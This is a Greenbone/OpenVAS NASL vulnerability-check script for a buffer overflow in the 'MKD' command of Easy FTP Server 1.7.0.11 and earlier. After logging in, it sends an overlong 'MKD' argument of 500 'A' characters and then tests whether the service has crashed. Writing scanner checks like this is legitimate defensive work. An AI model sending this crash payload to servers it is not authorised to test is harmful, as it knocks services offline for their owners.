if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802023" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-06-07 13:29:28 +0200 (Tue, 07 Jun 2011)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Easy~FTP Server POST Auth 'MKD' Command Buffer Overflow Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/easy_ftp/detected" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17354/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/101905" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to execute
  arbitrary code and failed attempt can lead to application crash." );
	script_tag( name: "affected", value: "Easy FTP Server Version 1.7.0.11 and prior." );
	script_tag( name: "insight", value: "The flaw is due to an error while parsing 'MKD' command, which
  can be exploited to crash the FTP service by sending 'MKD' command with an overly long parameter." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running Easy FTP Server and is prone to buffer overflow
  vulnerability." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!ContainsString( banner, "Powerd by BigFoolCat Ftp Server" ) && !ContainsString( banner, "220- Welcome to my ftp server" )){
	exit( 0 );
}
soc = open_sock_tcp( ftpPort );
if(!soc){
	exit( 0 );
}
banner = ftp_recv_line( socket: soc );
ftp_close( socket: soc );
if(!ContainsString( banner, "Powerd by BigFoolCat Ftp Server" ) && !ContainsString( banner, "220- Welcome to my ftp server" )){
	exit( 0 );
}
soc1 = open_sock_tcp( ftpPort );
if(!soc1){
	exit( 0 );
}
kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
ftplogin = ftp_log_in( socket: soc1, user: user, pass: pass );
if(!ftplogin){
	exit( 0 );
}
send( socket: soc1, data: NASLString( "MKD ", crap( length: 500, data: "A" ), "\r\n" ) );
ftp_close( socket: soc1 );
sleep( 2 );
soc2 = open_sock_tcp( ftpPort );
if(!soc2){
	security_message( port: ftpPort );
	exit( 0 );
}
ftp_close( socket: soc2 );

